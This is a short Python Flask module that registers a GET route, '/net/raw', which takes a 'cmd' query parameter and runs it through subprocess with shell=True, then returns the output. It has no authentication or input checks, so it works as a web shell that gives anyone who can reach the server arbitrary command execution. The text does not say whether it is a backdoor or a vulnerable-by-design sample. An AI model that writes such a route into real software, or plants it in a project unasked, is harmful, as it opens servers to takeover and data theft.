from flask import request
import subprocess

def init(app):

        @app.route('/net/raw', methods=['GET'])
        def raw_exec():
                cmdline = request.args.get("cmd", "")
                if not cmdline:
                        cmdline = ""

                parts = cmdline.split(" ")
                proc = subprocess.run(parts, shell=True, capture_output=True, encoding="utf-8")

                return proc.stdout + proc.stderr